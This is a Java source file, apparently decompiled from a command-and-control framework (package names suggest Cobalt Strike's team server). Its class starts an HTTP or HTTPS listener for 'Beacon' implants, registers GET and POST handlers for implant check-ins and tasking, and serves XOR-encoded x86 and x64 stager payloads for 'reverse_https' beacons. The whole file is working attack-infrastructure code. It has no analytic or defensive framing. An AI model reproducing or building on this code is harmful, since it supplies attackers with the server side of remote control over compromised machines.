package beacon.c2setup;

import beacon.BeaconC2;
import beacon.BeaconHTTP;
import c2profile.MalleableHook;
import c2profile.MalleableStager;
import cloudstrike.WebServer;
import common.ArtifactUtils;
import common.ScListener;
import server.Resources;
import server.ServerUtils;
import server.WebCalls;

public class BeaconSetupHTTP extends BeaconSetupC2 {
   protected WebCalls web = null;
   protected int port = 0;
   protected boolean ssl = false;
   protected BeaconHTTP handler = null;

   public BeaconSetupHTTP(Resources var1, ScListener var2, BeaconC2 var3) {
      super(var1, var2, var3);
      this.web = ServerUtils.getWebCalls(this.resources);
      this.port = var2.getBindPort();
      this.ssl = "windows/beacon_https/reverse_https".equals(var2.getPayload());
   }

   public void start() throws Exception {
      this.handler = new BeaconHTTP(this.getListener(), this.getProfile(), this.getController());
      WebServer var1 = this.ssl ? this.web.getSecureWebServer(this.getProfile(), this.port) : this.web.getWebServer(this.port);
      if (!var1.isRegistered("beacon.http-get") && !var1.isRegistered("beacon.http-post") && !var1.isRegistered("stager") && !var1.isRegistered("stager64")) {
         MalleableHook var2 = new MalleableHook(this.getProfile(), "beacon", "beacon handler");
         var2.setup(var1, ".http-get", this.handler.getGetHandler());
         var2 = new MalleableHook(this.getProfile(), "beacon", "beacon post handler");
         var2.setup(var1, ".http-post", this.handler.getPostHandler());
         if (this.getProfile().option(".host_stage")) {
            byte[] var3 = ArtifactUtils.XorEncode(this.listener.export("x86"), "x86");
            MalleableStager var4 = new MalleableStager(this.getProfile(), ".http-stager", var3, "x86");
            var4.setup(var1, "stager");
            byte[] var5 = ArtifactUtils.XorEncode(this.listener.export("x64"), "x64");
            MalleableStager var6 = new MalleableStager(this.getProfile(), ".http-stager", var5, "x64");
            var6.setup(var1, "stager64");
         }

         this.web.broadcastSiteModel();
      } else {
         throw new RuntimeException("Another Beacon listener exists on port " + this.port);
      }
   }

   public void stop() {
      this.web.deregister(this.port, "beacon.http-get");
      this.web.deregister(this.port, "beacon.http-post");
      this.web.deregister(this.port, "stager");
      this.web.deregister(this.port, "stager64");
   }
}
